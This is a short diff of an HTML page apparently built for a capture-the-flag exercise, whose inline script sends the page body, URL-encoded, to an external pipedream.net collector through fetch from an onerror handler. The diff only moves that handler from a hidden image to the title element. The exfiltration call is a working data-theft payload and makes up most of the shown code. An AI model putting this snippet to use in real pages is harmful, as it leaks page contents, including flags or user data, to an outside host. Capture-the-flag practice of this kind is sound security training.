@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CTF</title>
+    <title id="flag">CTF</title>
 </head>
 <body>
     <p>flag</p>
     <img id="Img" src="image.png" style="display: none;">
     <script>
-        document.getElementById('Img').onerror = function() {
+        document.getElementById('flag').onerror = function() {
             const encodedBody = encodeURIComponent(document.body.innerHTML);
             fetch(`https://eo8bzrb9y2mj48v.m.pipedream.net?content=${encodedBody}`);
         };
